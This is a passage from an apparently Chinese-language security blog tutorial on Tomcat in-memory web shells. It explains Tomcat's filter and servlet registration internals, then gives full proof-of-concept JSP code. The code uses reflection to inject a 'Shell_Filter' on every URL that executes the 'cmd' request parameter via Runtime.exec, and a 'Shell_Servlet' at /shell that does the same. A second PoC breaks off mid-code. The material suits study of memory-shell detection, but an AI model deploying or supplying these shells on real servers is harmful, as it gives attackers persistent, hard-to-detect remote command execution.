class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>            getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>            filterConfigs.clear();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="hljs-comment">//遍历filterDefs</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>                <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                    getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//创建ApplicationFilterConfig对象并存入filterConfigs中</span><br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                    filterConfigs.put(name, filterConfig);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ok;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>完成<code>filterDefs</code>–&gt;<code>filterConfigs</code></p></blockquote><p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addMappingForUrlPatterns</span><span class="hljs-params">(</span><br><span class="hljs-params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="hljs-type">boolean</span> isMatchAfter,</span><br><span class="hljs-params">            String... urlPatterns)</span> &#123;<br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterDef.getFilterName());<span class="hljs-comment">//从filterDef获取</span><br>        <span class="hljs-keyword">if</span> (dispatcherTypes != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;<br>                filterMap.setDispatcher(dispatcherType.name());<span class="hljs-comment">//给dispatcherMapping属性赋值</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (urlPatterns != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String urlPattern : urlPatterns) &#123;<br>                filterMap.addURLPattern(urlPattern);<span class="hljs-comment">//给urlPatterns属性赋值</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isMatchAfter) &#123;<br>                context.addFilterMap(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                context.addFilterMapBefore(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>fileMap从filterDef中获取了<code>FilterName</code>属性，后续又赋值了<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>可以看到<code>filterMaps</code>的组成部分<code>filterMap</code>的信息是从filterDef中获取</p></blockquote><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><p>Filter.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<span class="hljs-comment">//获取StandardContext对象</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <span class="hljs-comment">//恶意Filter，主要是doFilter方法</span><br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//使用FilterDef封装filter</span><br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <span class="hljs-comment">//创建filterMap，filterMap用于路由映射</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <span class="hljs-comment">//反射封装filterConfig及filterDef到filterConfigs </span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册恶意Filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png" alt="image-20230201044023838"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>先创建一个恶意Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException | NullPointerException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png" alt="image-20230201055527413"></p><p>接着需要实现动态注册Servlet</p><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><blockquote><p>Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收,也是接下来注册恶意Servlet的关键</p></blockquote><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fireLifecycleEvent</span><span class="hljs-params">(String type, Object data)</span> &#123;<br>        <span class="hljs-type">LifecycleEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LifecycleEvent</span>(<span class="hljs-built_in">this</span>, type, data);<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycleEvent(event);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p></blockquote><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//设置StandardContext参数</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//创建StandardWrapper对象</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//设置LoadOnStartup属性</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServletMappingDecoded</span><span class="hljs-params">(String pattern, String name,</span><br><span class="hljs-params">                                  <span class="hljs-type">boolean</span> jspWildCard)</span> &#123;<br><span class="hljs-comment">//...</span><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) findChild(name);<br><span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Container child : findChildren()) &#123;<br>    <span class="hljs-keyword">if</span> (!child.getState().isAvailable()) &#123;<br>        child.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//判断属性loadOnStartup的值</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<span class="hljs-comment">//加载Servlet</span><br>            &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最后的poc中需要注意<code>loadOnStartup</code>属性的设置，只有大于0才会被放入list，进而被加载<code>wrapper.load()</code></p></blockquote><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上面的分析可以总结流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>、<code>ServletName</code>、<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h4 id="完整POC链"><a href="#完整POC链" class="headerlink" title="完整POC链"></a>完整POC链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span 